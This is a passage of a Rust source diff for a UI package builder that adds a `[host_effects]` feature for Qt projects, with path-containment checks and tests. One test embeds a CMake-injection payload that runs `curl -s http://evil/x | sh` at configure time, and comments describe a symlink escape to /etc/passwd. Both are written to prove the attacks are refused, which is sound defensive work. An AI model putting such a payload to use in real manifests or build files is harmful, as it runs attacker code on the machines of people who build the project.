@@ -1808,6 +1808,7 @@ fn build_package_inner(
                 profile,
                 runtime_library,
                 host_asset_dependencies: &manifest.host_assets.dependencies,
+                host_effects: &manifest.host_effects,
             })?;
             artifacts.extend(shell_artifacts);
         }
@@ -1819,6 +1820,14 @@ fn build_package_inner(
     let (host_asset_artifacts, replaced_generated_files) =
         install_host_assets(&manifest, opts.backend, &opts.package_root, &backend_dir)?;
     artifacts.extend(host_asset_artifacts);
+    // After the host assets, so a package that declares both gets the same
+    // last-write-wins ordering it would get from two `[host_assets]` entries.
+    artifacts.extend(install_host_effects(
+        &manifest,
+        opts.backend,
+        &opts.package_root,
+        &backend_dir,
+    )?);
 
     // The explicitly selected engine is the final write to its conventional
     // destination. A package-owned generic host asset cannot silently replace
@@ -1840,6 +1849,121 @@ fn build_package_inner(
         components_built,
         replaced_generated_files,
     })
+}
+
+/// Copy a package's `[host_effects]` files into the emitted project.
+///
+/// Separate from `install_host_assets` because the obligation is different:
+/// these files are named in the generated build and compiled, so a failure to
+/// copy one is a project that will not build rather than a missing extra.
+///
+/// Unlike `install_host_assets`, the source is canonicalised and checked to be
+/// inside the package. `safe_manifest_relative_path` is lexical -- it refuses
+/// `..` and absolute paths, but a *symlink* at `host/qt/effects.h` pointing at
+/// `/etc/passwd` passes it, and the bytes are then copied into the project.
+/// These files are compiled and shipped rather than merely copied, which is
+/// what makes that worth closing here. `load_package_tokens` already does the
+/// same check for the style palette; `install_host_assets` does not, which is a
+/// gap worth closing separately rather than copying.
+fn install_host_effects(
+    manifest: &MosaicPackage,
+    backend: Backend,
+    package_root: &Path,
+    backend_dir: &Path,
+) -> Result<Vec<PathBuf>, BuildError> {
+    let backend_name = backend.dir_name();
+    // A `[host_effects]` file is a NEW build source by definition, never a
+    // replacement for a generated one -- so overwriting is refused outright
+    // rather than recorded.
+    //
+    // `[host_assets]` may replace a generated file and reports it through
+    // `DegradationReport::replaced_generated_files`, which is the signal a
+    // reviewer reads to see that a package took over the application boundary --
+    // and it is what UI47 §5.5.5 pins its acceptance to. This function runs
+    // after that one and returns only the paths it wrote, so a `target` of
+    // `main.cpp` or `MosaicHost.cpp` would take the boundary over with that
+    // field coming back EMPTY. Refusing keeps the one honest answer: if a
+    // package means to replace a generated file, it says so in `[host_assets]`,
+    // where it is disclosed.
+    //
+    // Nothing below runs for a package with no handler for this backend, which
+    // is every package today -- walking the output tree and canonicalising per
+    // file is real work to do for an empty list.
+    if !manifest
+        .host_effects
+        .files
+        .iter()
+        .any(|file| file.backend == backend_name)
+    {
+        return Ok(Vec::new());
+    }
+    let generated = generated_files_on_disk(backend_dir)?;
+    let canonical_root = package_root
+        .canonicalize()
+        .map_err(|e| BuildError::Io(format!("canonicalize {}: {e}", package_root.display())))?;
+    let mut written = Vec::new();
+    // `*` is refused by the manifest for this section, so plain equality is the
+    // whole matching rule -- no wildcard arm to keep in step with the validator.
+    for file in manifest
+        .host_effects
+        .files
+        .iter()
+        .filter(|file| file.backend == backend_name)
+    {
+        let source_rel = safe_manifest_relative_path("host effect source", &file.source)?;
+        let target_rel = safe_manifest_relative_path("host effect target", &file.target)?;
+        let source = package_root.join(&source_rel);
+
+        let canonical_source = source
+            .canonicalize()
+            .map_err(|e| BuildError::Io(format!("read {}: {e}", source.display())))?;
+        if !canonical_source.starts_with(&canonical_root) {
+            return Err(BuildError::Io(format!(
+                "host effect source {} resolves to {}, outside the package",
+                file.source,
+                canonical_source.display()
+            )));
+        }
+
+        // A FIFO inside the package resolves and contains, and `fs::read` on one
+        // blocks forever -- a build that hangs rather than fails. Directories
+        // and dangling links already fail loudly; this covers the one that does
+        // not.
+        let metadata = fs::metadata(&canonical_source)
+            .map_err(|e| BuildError::Io(format!("stat {}: {e}", source.display())))?;
+        if !metadata.is_file() {
+            return Err(BuildError::Io(format!(
+                "host effect source {} is not a regular file",
+                file.source
+            )));
+        }
+        let bytes = fs::read(&canonical_source)
+            .map_err(|e| BuildError::Io(format!("read {}: {e}", source.display())))?;
+        let target = backend_dir.join(&target_rel);
+        // Same comparison install_host_assets makes: resolve the destination
+        // and look it up in the canonical map. `canonicalize` fails when the
+        // path does not exist, which is exactly the ordinary case -- a new
+        // source -- so `.ok()` yielding `None` means "not a generated file".
+        if fs::canonicalize(&target)
+            .ok()
+            .and_then(|resolved| generated.get(&resolved))
+            .is_some()
+        {
+            return Err(BuildError::Io(format!(
+                "host effect target {} would replace a generated file; \
+                 declare it in `[host_assets]` if replacement is intended, \
+                 where the override is reported",
+                file.target
+            )));
+        }
+        if let Some(parent) = target.parent() {
+            fs::create_dir_all(parent)
+                .map_err(|e| BuildError::Io(format!("create {}: {e}", parent.display())))?;
+        }
+        write_file(&target, &bytes)?;
+        written.push(target);
+    }
+    Ok(written)
 }
 
 /// Copy a package's `[host_assets]` into the emitted project.
@@ -2196,6 +2320,13 @@ struct ProjectShellOptions<'a> {
     /// Dependency coordinates this package's `[host_assets]` declared, so the
     /// generated build file can declare what the installed host files need.
     host_asset_dependencies: &'a [mosaic_package_manifest::HostAssetDependency],
+    /// The package's `[host_effects]`, so the generated build can compile the
+    /// handler and the generated entry point can install it.
+    ///
+    /// Threaded in rather than read from the manifest here for the same reason
+    /// `host_asset_dependencies` is: `emit_project_shell` never sees the
+    /// manifest, and giving it one would widen what shell emission may reach.
+    host_effects: &'a mosaic_package_manifest::HostEffectsSection,
 }
 
 fn emit_project_shell(options: ProjectShellOptions<'_>) -> Result<Vec<PathBuf>, BuildError> {
@@ -2212,6 +2343,7 @@ fn emit_project_shell(options: ProjectShellOptions<'_>) -> Result<Vec<PathBuf>, 
         profile,
         runtime_library,
         host_asset_dependencies,
+        host_effects,
     } = options;
     // Re-read the triple. This duplicates `compile_one_component`'s
     // file-loading logic; we accept the redundancy because the shell
@@ -2573,12 +2705,17 @@ fn emit_project_shell(options: ProjectShellOptions<'_>) -> Result<Vec<PathBuf>, 
             }
             if let Some(proj) = r.project {
                 let bundled_runtime = runtime_library.map(runtime_file_name).transpose()?;
-                let cmake_lists = qt_cmake_with_package_exports(
-                    &proj.cmake_lists,
+                let cmake_lists = qt_cmake_with_host_effects(
+                    &qt_cmake_with_package_exports(
+                        &proj.cmake_lists,
+                        component,
+                        components,
+                        bundled_runtime,
+                    ),
                     component,
-                    components,
-                    bundled_runtime,
+                    host_effects,
                 );
+                let main_cpp = qt_main_with_host_effects(&proj.main_cpp, host_effects);
                 let runtime_binding =
                     mosaic_app_bindings::qt_runtime_binding_for_application(package_name);
                 let contract = if require_runtime {
@@ -2607,7 +2744,7 @@ fn emit_project_shell(options: ProjectShellOptions<'_>) -> Result<Vec<PathBuf>, 
                 // §3.4 says --emit-project's shell IS the qmldir.
                 let flat: [(&str, &str); 6] = [
                     ("CMakeLists.txt", &cmake_lists),
-                    ("main.cpp", &proj.main_cpp),
+                    ("main.cpp", &main_cpp),
                     ("qmldir", &proj.qmldir),
                     ("README.md", &readme),
                     ("MosaicHost.h", &runtime_binding.header),
@@ -2788,6 +2925,131 @@ fn qt_cmake_with_package_exports(
         .expect("write Qt runtime packaging CMake");
     }
     cmake
+}
+
+/// Compile a package's `[host_effects]` files into the Qt target.
+///
+/// Qt's generated `CMakeLists.txt` names its sources explicitly --
+/// `qt_add_executable(... main.cpp)` plus `target_sources(... MosaicHost.cpp
+/// MosaicHost.h)` -- so a file merely copied into the project directory is
+/// never compiled. That is exactly why the section carries a build-source
+/// obligation and not only a copy: on the web backends `[host_assets]` already
+/// wires new files in through `activate_react_host_asset` and its HTML
+/// sibling, but on Qt and XAML nothing does.
+fn qt_cmake_with_host_effects(
+    generated: &str,
+    mounted_component: &str,
+    host_effects: &mosaic_package_manifest::HostEffectsSection,
+) -> String {
+    let targets: Vec<&str> = host_effects
+        .files
+        .iter()
+        .filter(|file| file.backend == "qt")
+        .map(|file| file.target.as_str())
+        .collect();
+    if targets.is_empty() {
+        return generated.to_string();
+    }
+    let mut cmake = generated.to_string();
+    // One quoted argument per line, rather than a space-joined list. The
+    // manifest now refuses a target that is not a plain relative path, so
+    // nothing should reach here needing quoting -- this is the second layer,
+    // and it is what keeps a future loosening of that regex from becoming CMake
+    // injection silently.
+    write!(
+        cmake,
+        "\n# Package-declared effect handler, from `[host_effects]`.\ntarget_sources({mounted_component} PRIVATE\n"
+    )
+    .expect("write Qt host-effect sources");
+    for target in targets {
+        writeln!(cmake, "  \"{target}\"").expect("write Qt host-effect source");
+    }
+    cmake.push_str(")\n");
+    cmake
+}
+
+/// Install a package's effect handler in the generated Qt entry point.
+///
+/// The call goes immediately after the host is constructed, which is the
+/// earliest point it can: the host creates the application in its constructor
+/// and settles that first update there, so an effect raised by the STARTUP
+/// update is fail-swept before any handler could exist. UI47 §5.5.4 records
+/// that limit and why it is not worth two-phase construction today.
+///
+/// Anchored on the declaration rather than a line number because the generated
+/// entry point has two shapes -- the native-complete one indents four spaces,
+/// the other two and wraps the host in `#if MOSAIC_HAS_HOST`. Inserting after
+/// the declaration inherits whichever guard context it is already in, so the
+/// install call cannot end up outside the `#if` that defines the host.
+fn qt_main_with_host_effects(
+    generated: &str,
+    host_effects: &mosaic_package_manifest::HostEffectsSection,
+) -> String {
+    let Some(handler) = host_effects
+        .handlers
+        .iter()
+        .find(|handler| handler.backend == "qt")
+    else {
+        return generated.to_string();
+    };
+    const DECLARATION: &str = "MosaicHost mosaicHost;";
+    let Some(declaration_start) = generated.find(DECLARATION) else {
+        // No host in this shape, so there is nothing to install onto. Returning
+        // the input unchanged is right: the alternative is emitting a call to a
+        // symbol with no argument to pass it.
+        return generated.to_string();
+    };
+
+    let line_start = generated[..declaration_start]
+        .rfind('\n')
+        .map_or(0, |index| index + 1);
+    let indent: String = generated[line_start..declaration_start].to_string();
+    let line_end = generated[declaration_start..]
+        .find('\n')
+        .map_or(generated.len(), |index| declaration_start + index + 1);
+
+    let mut out = String::with_capacity(generated.len() + 256);
+    out.push_str(&generated[..line_end]);
+    writeln!(
+        out,
+        "{indent}// Package-declared effect handler, from `[host_effects]`."
+    )
+    .expect("write Qt host-effect comment");
+    writeln!(out, "{indent}{}(mosaicHost);", handler.install)
+        .expect("write Qt host-effect install");
+    out.push_str(&generated[line_end..]);
+
+    let Some(include) = handler.include.as_deref() else {
+        return out;
+    };
+    // Includes are file-scope only, so this cannot sit beside the call. It goes
+    // before `int main(`, and inside the same `#if` the rest of the host is
+    // guarded by when that shape is the one being emitted -- otherwise a build
+    // without a host would compile a header declaring a function that takes one.
+    let guarded = out.contains("#if MOSAIC_HAS_HOST");
+    let directive = if guarded {
+        format!("#if MOSAIC_HAS_HOST\n#include \"{include}\"\n#endif\n")
+    } else {
+        format!("#include \"{include}\"\n")
+    };
+    match out.find("int main(") {
+        Some(index) => {
+            // Anchored to the START of that line, the way the install call
+            // above is. A preprocessor directive is only valid at line start,
+            // and inserting at the raw byte offset would splice one mid-line if
+            // `int main(` ever appeared inside a comment or a string literal
+            // first. Both current Qt shapes put it at a line start, so this is
+            // rigour rather than a live bug -- but the two insertions should not
+            // differ in care.
+            let line_start = out[..index].rfind('\n').map_or(0, |at| at + 1);
+            let mut with_include = String::with_capacity(out.len() + directive.len());
+            with_include.push_str(&out[..line_start]);
+            with_include.push_str(&directive);
+            with_include.push_str(&out[line_start..]);
+            with_include
+        }
+        None => out,
+    }
 }
 
 fn build_electron_package_json(
@@ -4016,7 +4278,14 @@ fn merge_dependency_styles(
     own
 }
 
-fn slot_state_axes(
+/// The slot-to-state axes a component's model declares.
+///
+/// Public so consumers that compile a stylesheet themselves -- package tests,
+/// tooling -- bind states the same way a real build does. When this lived
+/// privately here and callers rebuilt the rule inline, they only handled
+/// `one-of` slots, so a UI57 bool-slot state read as unbound in a test while
+/// binding correctly in production (#14639).
+pub fn slot_state_axes(
     model: &mosmodel_compiler::MosmodelComponent,
 ) -> Vec<mosstyle_compiler::SlotStateAxis> {
     model
@@ -6452,21 +6721,58 @@ layout AccessibleText {
 
     #[test]
     fn authored_table_focus_reports_unimplemented_backends() {
-        let node = LayoutNode { tag: "HostTable".into(), part_name: None, props: vec![], children: vec![] };
+        let node = LayoutNode {
+            tag: "HostTable".into(),
+            part_name: None,
+            props: vec![],
+            children: vec![],
+        };
         for name in ["focusable", "a11y-label"] {
-            let prop = LayoutProp { name: name.into(), value: LayoutPropValue::Keyword("true".into()) };
-            for backend in [Backend::React, Backend::Flutter, Backend::Compose, Backend::Qt, Backend::SwiftUI, Backend::Xaml] {
+            let prop = LayoutProp {
+                name: name.into(),
+                value: LayoutPropValue::Keyword("true".into()),
+            };
+            for backend in [
+                Backend::React,
+                Backend::Flutter,
+                Backend::Compose,
+                Backend::Qt,
+                Backend::SwiftUI,
+                Backend::Xaml,
+            ] {
                 let result = ignored_native_property(backend, &node, &prop, &HashSet::new());
-                assert_eq!(result.map(|value| value.0), if backend == Backend::React { None } else { Some("accessibility.table-focus-unimplemented") });
+                assert_eq!(
+                    result.map(|value| value.0),
+                    if backend == Backend::React {
+                        None
+                    } else {
+                        Some("accessibility.table-focus-unimplemented")
+                    }
+                );
             }
         }
     }
 
     #[test]
     fn authored_table_cells_report_unimplemented_backends() {
-        let node = LayoutNode { tag: "Text".into(), part_name: None, props: vec![], children: vec![] };
-        let prop = LayoutProp { name: "table-cell-role".into(), value: LayoutPropValue::Keyword("row-header".into()) };
-        for backend in [Backend::React, Backend::Flutter, Backend::Compose, Backend::Qt, Backend::SwiftUI, Backend::Xaml] {
+        let node = LayoutNode {
+            tag: "Text".into(),
+            part_name: None,
+            props: vec![],
+            children: vec![],
+        };
+        let prop = LayoutProp {
+            name: "table-cell-role".into(),
+            value: LayoutPropValue::Keyword("row-header".into()),
+        };
+        for backend in [
+            Backend::React,
+            Backend::Flutter,
+            Backend::Compose,
+            Backend::Qt,
+            Backend::SwiftUI,
+            Backend::Xaml,
+        ] {
             let result = ignored_native_property(backend, &node, &prop, &HashSet::new());
             assert_eq!(result.is_some(), backend != Backend::React);
         }
@@ -6544,17 +6850,49 @@ layout AccessibleText {
     #[test]
     fn typography_bindings_are_explicitly_degraded_outside_react() {
         let pkg = make_package("mosaic-pkg-scaled-text", &["ScaledText"]);
-        fs::write(pkg.path().join("src/ScaledText.mil"),
-            "component ScaledText { slot text-size : number ; }\n").unwrap();
+        fs::write(
+            pkg.path().join("src/ScaledText.mil"),
+            "component ScaledText { slot text-size : number ; }\n",
+        )
+        .unwrap();
         fs::write(pkg.path().join("src/ScaledText.mll"),
             "layout ScaledText { Column [ root ] { Text (content: \"Title\", font-size: slot: text-size) HostButton (label: \"Action\", font-size: slot: text-size) HostInput (font-size: slot: text-size) HostTable (font-size: slot: text-size) } }\n").unwrap();
-        for backend in [Backend::Compose, Backend::Flutter, Backend::Qt, Backend::SwiftUI, Backend::Xaml, Backend::Html, Backend::WebComponent, Backend::React, Backend::Electron] {
+        for backend in [
+            Backend::Compose,
+            Backend::Flutter,
+            Backend::Qt,
+            Backend::SwiftUI,
+            Backend::Xaml,
+            Backend::Html,
+            Backend::WebComponent,
+            Backend::React,
+            Backend::Electron,
+        ] {
             let out = TempDir::new().unwrap();
-            let report = analyze_package_degradations(&BuildOptions {
-                package_root: pkg.path().to_path_buf(), output_root: out.path().to_path_buf(),
-                backend, emit_project: false, theme: None,
-            }, BuildProfile::NativeComplete).unwrap();
-            assert_eq!(report.degradations.iter().filter(|entry| entry.code == "typography.font-size-binding-unimplemented").count(), if matches!(backend, Backend::React | Backend::Electron) { 0 } else { 4 }, "{backend:?}");
+            let report = analyze_package_degradations(
+                &BuildOptions {
+                    package_root: pkg.path().to_path_buf(),
+                    output_root: out.path().to_path_buf(),
+                    backend,
+                    emit_project: false,
+                    theme: None,
+                },
+                BuildProfile::NativeComplete,
+            )
+            .unwrap();
+            assert_eq!(
+                report
+                    .degradations
+                    .iter()
+                    .filter(|entry| entry.code == "typography.font-size-binding-unimplemented")
+                    .count(),
+                if matches!(backend, Backend::React | Backend::Electron) {
+                    0
+                } else {
+                    4
+                },
+                "{backend:?}"
+            );
         }
     }
 
@@ -7747,7 +8085,16 @@ layout NativeEvents {
         fs::write(probe.path().join("Probe"), b"x").unwrap();
         let case_insensitive = probe.path().join("probe").exists();
 
-        let mut spellings = vec!["MosaicHost.cpp", "MosaicHost.cpp/", "MosaicHost.cpp/."];
+        // `MosaicHost.cpp/` and `MosaicHost.cpp/.` used to be here. The manifest
+        // now refuses a target that is not a plain relative path, so they never
+        // reach the builder at all -- refused outright, which is strictly
+        // stronger than being allowed and reported. The companion test below
+        // pins that, so the coverage moved rather than vanished.
+        //
+        // What remains is the case that still needs the CANONICAL comparison and
+        // that a string compare would miss: one file under two spellings on a
+        // case-insensitive filesystem.
+        let mut spellings = vec!["MosaicHost.cpp"];
         if case_insensitive {
             spellings.push("mosaichost.cpp");
         }
@@ -7830,8 +8177,16 @@ files = [
                 },
                 BuildProfile::Permissive,
             );
+            // Refused either way, and which layer refuses it is not what this
+            // test is for: the manifest's own path shape now rejects these
+            // spellings before the builder sees them, and `safe_manifest_
+            // relative_path` still stands behind it for anything constructed
+            // without going through `parse`.
             assert!(
-                matches!(result, Err(BuildError::UnsafePath { .. })),
+                matches!(
+                    result,
+                    Err(BuildError::UnsafePath { .. }) | Err(BuildError::Manifest(_))
+                ),
                 "target `{rejected}` should be refused outright, got {result:?}"
             );
         }
@@ -8274,13 +8629,16 @@ files = [
             theme: None,
         })
         .unwrap_err();
+        // `..` is now refused by the manifest's path shape before the builder's
+        // own check sees it. Both refusals are real; this asserts the escape
+        // does not happen, not which layer stops it.
         assert!(
             matches!(
                 err,
                 BuildError::UnsafePath {
                     kind: "host asset target",
                     ..
-                }
+                } | BuildError::Manifest(_)
             ),
             "expected UnsafePath(host asset target), got {err:?}"
         );
@@ -10684,5 +11042,563 @@ version = "1"
                 "{backend:?} leaked the internal child mount"
             );
         }
+    }
+}
+
+#[cfg(test)]
+mod qt_host_effect_tests {
+    use super::*;
+
+    fn section(toml: &str) -> mosaic_package_manifest::HostEffectsSection {
+        let manifest = format!(
+            r#"
+[package]
+name = "mosaic-pkg-probe"
+version = "0.1.0"
+description = "probe"
+license = "MIT"
+
+[components]
+exports = ["Probe"]
+
+[dependencies]
+
+{toml}
+
+[kernel]
+version = "1"
+"#
+        );
+        mosaic_package_manifest::parse(&manifest)
+            .expect("probe manifest must parse")
+            .host_effects
+    }
+
+    const NATIVE_COMPLETE_MAIN: &str = concat!(
+        "#include <QApplication>\n",
+        "#include \"MosaicHost.h\"\n",
+        "\n",
+        "int main(int argc, char *argv[])\n",
+        "{\n",
+        "  try {\n",
+        "    MosaicHost::registerTypes();\n",
+        "    MosaicHost mosaicHost;\n",
+        "    mosaicHost.requireRuntime();\n",
+        "    return app.exec();\n",
+        "  }\n",
+        "}\n",
+    );
+
+    const GUARDED_MAIN: &str = concat!(
+        "#include <QApplication>\n",
+        "\n",
+        "int main(int argc, char *argv[])\n",
+        "{\n",
+        "  QObject *root = view.rootObject();\n",
+        "#if MOSAIC_HAS_HOST\n",
+        "  MosaicHost mosaicHost;\n",
+        "  mosaicHost.attach(root);\n",
+        "#endif\n",
+        "}\n",
+    );
+
+    #[test]
+    fn a_package_without_the_section_changes_nothing() {
+        // The overwhelmingly common case: every package that needs no host
+        // capability must emit byte-identical output.
+        let empty = section("");
+        assert_eq!(
+            qt_main_with_host_effects(NATIVE_COMPLETE_MAIN, &empty),
+            NATIVE_COMPLETE_MAIN
+        );
+        assert_eq!(
+            qt_cmake_with_host_effects("target_sources(App PRIVATE a.cpp)\n", "App", &empty),
+            "target_sources(App PRIVATE a.cpp)\n"
+        );
+    }
+
+    #[test]
+    fn the_install_call_lands_after_the_host_is_constructed() {
+        let effects = section(
+            r#"
+[host_effects]
+handlers = [
+  { backend = "qt", include = "probe_effects.h", install = "installProbeEffects" },
+]
+"#,
+        );
+        let main = qt_main_with_host_effects(NATIVE_COMPLETE_MAIN, &effects);
+        let declaration = main.find("MosaicHost mosaicHost;").expect("declaration");
+        let install = main
+            .find("installProbeEffects(mosaicHost);")
+            .expect("install");
+        assert!(
+            declaration < install,
+            "the handler cannot be installed before the host exists:\n{main}"
+        );
+        // And before the event loop, or the first dispatch races it.
+        let exec = main.find("app.exec();").expect("exec");
+        assert!(
+            install < exec,
+            "install must precede the event loop:\n{main}"
+        );
+        // Indentation is inherited from the declaration rather than assumed.
+        assert!(
+            main.contains("    installProbeEffects(mosaicHost);"),
+            "expected four-space indent to match the declaration:\n{main}"
+        );
+    }
+
+    #[test]
+    fn the_include_is_guarded_exactly_when_the_host_is() {
+        // In the guarded shape, an unguarded include would compile a header
+        // declaring a function that takes a MosaicHost in a build that has no
+        // MosaicHost.
+        let effects = section(
+            r#"
+[host_effects]
+handlers = [
+  { backend = "qt", include = "probe_effects.h", install = "installProbeEffects" },
+]
+"#,
+        );
+        let guarded = qt_main_with_host_effects(GUARDED_MAIN, &effects);
+        assert!(
+            guarded.contains("#if MOSAIC_HAS_HOST\n#include \"probe_effects.h\"\n#endif"),
+            "the include must inherit the host's guard:\n{guarded}"
+        );
+        // The install call lands inside the existing guard, because it is
+        // inserted after the declaration that is already inside it.
+        let install = guarded.find("installProbeEffects").expect("install");
+        let endif = guarded.find("#endif\n}").unwrap_or(guarded.len());
+        assert!(
+            install < endif,
+            "install must sit inside the guard:\n{guarded}"
+        );
+
+        let plain = qt_main_with_host_effects(NATIVE_COMPLETE_MAIN, &effects);
+        assert!(
+            plain.contains("#include \"probe_effects.h\"")
+                && !plain.contains("#if MOSAIC_HAS_HOST"),
+            "an unguarded shape must not gain a guard:\n{plain}"
+        );
+    }
+
+    #[test]
+    fn a_handler_without_an_include_still_installs() {
+        let effects = section(
+            r#"
+[host_effects]
+handlers = [
+  { backend = "qt", install = "installProbeEffects" },
+]
+"#,
+        );
+        let main = qt_main_with_host_effects(NATIVE_COMPLETE_MAIN, &effects);
+        assert!(main.contains("installProbeEffects(mosaicHost);"), "{main}");
+        assert!(!main.contains("#include \"\""), "{main}");
+    }
+
+    #[test]
+    fn another_backends_handler_is_not_wired_into_qt() {
+        let effects = section(
+            r#"
+[host_effects]
+handlers = [
+  { backend = "compose", install = "installProbeEffects" },
+]
+"#,
+        );
+        assert_eq!(
+            qt_main_with_host_effects(NATIVE_COMPLETE_MAIN, &effects),
+            NATIVE_COMPLETE_MAIN
+        );
+    }
+
+    #[test]
+    fn declared_files_reach_the_qt_build() {
+        // Qt names its sources explicitly, so a file merely copied in is never
+        // compiled. This is the half that makes the section more than a copy.
+        let effects = section(
+            r#"
+[host_effects]
+files = [
+  { backend = "qt", source = "host/qt/effects.cpp", target = "probe_effects.cpp" },
+  { backend = "qt", source = "host/qt/effects.h", target = "probe_effects.h" },
+  { backend = "compose", source = "host/compose/Effects.kt", target = "Effects.kt" },
+]
+handlers = [
+  { backend = "qt", install = "installProbeEffects" },
+  { backend = "compose", install = "installProbeEffects" },
+]
+"#,
+        );
+        let cmake =
+            qt_cmake_with_host_effects("qt_add_executable(App main.cpp)\n", "App", &effects);
+        // One QUOTED argument per line. The manifest refuses a target that is
+        // not a plain relative path, so nothing should reach here needing the
+        // quotes -- they are the second layer, and asserting them is what stops
+        // a future loosening of that regex from becoming CMake injection
+        // quietly.
+        assert!(
+            cmake.contains(
+                "target_sources(App PRIVATE\n  \"probe_effects.cpp\"\n  \"probe_effects.h\"\n)"
+            ),
+            "both Qt files must be compiled, each quoted:\n{cmake}"
+        );
+        // And only Qt's: the Kotlin file would not compile in a C++ target.
+        assert!(
+            !cmake.contains("Effects.kt"),
+            "another backend's file must not reach the Qt build:\n{cmake}"
+        );
+    }
+}
+
+#[cfg(test)]
+#[cfg(unix)]
+mod host_effect_containment_tests {
+    use super::*;
+
+    fn probe_manifest() -> MosaicPackage {
+        mosaic_package_manifest::parse(
+            r#"
+[package]
+name = "mosaic-pkg-probe"
+version = "0.1.0"
+description = "probe"
+license = "MIT"
+
+[components]
+exports = ["Probe"]
+
+[dependencies]
+
+[host_effects]
+files = [
+  { backend = "qt", source = "host/qt/effects.h", target = "probe_effects.h" },
+]
+handlers = [
+  { backend = "qt", install = "installProbeEffects" },
+]
+
+[kernel]
+version = "1"
+"#,
+        )
+        .expect("probe manifest must parse")
+    }
+
+    fn scratch(name: &str) -> PathBuf {
+        let root = std::env::temp_dir().join(format!(
+            "mosaic-host-effect-{name}-{}-{}",
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .expect("system clock after epoch")
+                .as_nanos()
+        ));
+        fs::create_dir_all(root.join("host").join("qt")).expect("create the package tree");
+        fs::create_dir_all(root.join("out")).expect("create the output tree");
+        root
+    }
+
+    #[test]
+    fn an_ordinary_file_is_copied_into_the_project() {
+        let root = scratch("ok");
+        fs::write(root.join("host/qt/effects.h"), b"// handler\n").expect("write the source");
+        let written =
+            install_host_effects(&probe_manifest(), Backend::Qt, &root, &root.join("out"))
+                .expect("an in-package source must be copied");
+        assert_eq!(written.len(), 1);
+        assert_eq!(
+            fs::read_to_string(root.join("out/probe_effects.h")).expect("read the copy"),
+            "// handler\n"
+        );
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn a_symlink_escaping_the_package_is_refused() {
+        // `safe_manifest_relative_path` is LEXICAL: it refuses `..` and absolute
+        // paths, and a symlink at an innocent-looking relative path sails
+        // through it. These files are compiled into the artifact rather than
+        // merely copied, so the bytes would be built and shipped.
+        let root = scratch("symlink");
+        // Genuinely outside the package root, which is what the check is about.
+        // A first draft of this test put the secret INSIDE `root` and passed a
+        // different directory as the package root, so the path did not resolve
+        // at all and the containment branch never ran -- the test failed on a
+        // missing file while appearing to exercise the guard.
+        let outside = root.parent().expect("temp dir has a parent").join(format!(
+            "mosaic-host-effect-secret-{}-{}",
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .expect("system clock after epoch")
+                .as_nanos()
+        ));
+        fs::write(&outside, b"SECRET\n").expect("write the file outside the package");
+        std::os::unix::fs::symlink(&outside, root.join("host/qt/effects.h"))
+            .expect("create the escaping symlink");
+        // The symlink must actually resolve, or this proves only that a broken
+        // link is refused -- which is a different and much weaker claim.
+        assert_eq!(
+            fs::read_to_string(root.join("host/qt/effects.h")).expect("the symlink must resolve"),
+            "SECRET\n"
+        );
+
+        let error = install_host_effects(&probe_manifest(), Backend::Qt, &root, &root.join("out"))
+            .expect_err("a source resolving outside the package must be refused");
+        let message = format!("{error:?}");
+        assert!(
+            message.contains("outside the package"),
+            "the refusal must say why: {message}"
+        );
+        assert!(
+            !root.join("out/probe_effects.h").exists(),
+            "nothing may be written when the source escapes"
+        );
+        let _ = fs::remove_file(&outside);
+        let _ = fs::remove_dir_all(&root);
+    }
+}
+
+#[cfg(test)]
+mod host_effect_target_injection_tests {
+    use super::*;
+
+    #[test]
+    fn a_target_carrying_cmake_is_refused_at_parse() {
+        // The whole exploit, verbatim. `target` is space-joined into
+        // `target_sources(App PRIVATE ...)`, and the emitter's path check is
+        // LEXICAL -- newlines and parens are legal in a Unix filename, so this
+        // splits into ordinary `Normal` components and sails through. The
+        // generated CMakeLists then runs `execute_process` at CONFIGURE time on
+        // whoever builds the emitted project.
+        let manifest = r#"
+[package]
+name = "mosaic-pkg-probe"
+version = "0.1.0"
+description = "probe"
+license = "MIT"
+
+[components]
+exports = ["Probe"]
+
+[dependencies]
+
+[host_effects]
+files = [
+  { backend = "qt", source = "host/qt/effects.cpp", target = "effects.cpp)\nexecute_process(COMMAND sh -c \"curl -s http://evil/x | sh\")\n#" },
+]
+handlers = [
+  { backend = "qt", install = "installProbeEffects" },
+]
+
+[kernel]
+version = "1"
+"#;
+        let error = mosaic_package_manifest::parse(manifest)
+            .expect_err("a target carrying CMake must be refused");
+        assert!(
+            matches!(
+                error,
+                mosaic_package_manifest::ManifestError::InvalidHostEffectTarget(_)
+            ),
+            "unexpected error: {error}"
+        );
+    }
+
+    #[test]
+    fn the_lexical_path_check_alone_would_have_allowed_it() {
+        // Why the refusal has to live at parse rather than at copy time: the
+        // emitter's own validator accepts the payload, because every segment
+        // really is a legal filename. If this ever starts failing, the path
+        // check grew teeth and this test should be re-read, not deleted.
+        let payload = "effects.cpp)\nexecute_process(COMMAND sh -c \"x\")\n#";
+        assert!(
+            safe_manifest_relative_path("host effect target", payload).is_ok(),
+            "the lexical check was expected to accept this; the parse-time \
+             refusal is what actually stops it"
+        );
+    }
+}
+
+#[cfg(test)]
+mod host_effect_overwrite_tests {
+    use super::*;
+
+    fn manifest_targeting(target: &str) -> MosaicPackage {
+        mosaic_package_manifest::parse(&format!(
+            r#"
+[package]
+name = "mosaic-pkg-probe"
+version = "0.1.0"
+description = "probe"
+license = "MIT"
+
+[components]
+exports = ["Probe"]
+
+[dependencies]
+
+[host_effects]
+files = [
+  {{ backend = "qt", source = "host/qt/effects.h", target = "{target}" }},
+]
+handlers = [
+  {{ backend = "qt", install = "installProbeEffects" }},
+]
+
+[kernel]
+version = "1"
+"#
+        ))
+        .expect("probe manifest must parse")
+    }
+
+    fn scratch() -> PathBuf {
+        let root = std::env::temp_dir().join(format!(
+            "mosaic-host-effect-overwrite-{}-{}",
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .expect("system clock after epoch")
+                .as_nanos()
+        ));
+        fs::create_dir_all(root.join("host").join("qt")).expect("create the package tree");
+        fs::create_dir_all(root.join("out")).expect("create the output tree");
+        fs::write(root.join("host/qt/effects.h"), b"// handler\n").expect("write the source");
+        root
+    }
+
+    #[test]
+    fn replacing_a_generated_file_is_refused() {
+        // `[host_assets]` may replace a generated file and REPORTS it through
+        // `replacedGeneratedFiles` -- the signal a reviewer reads, and what
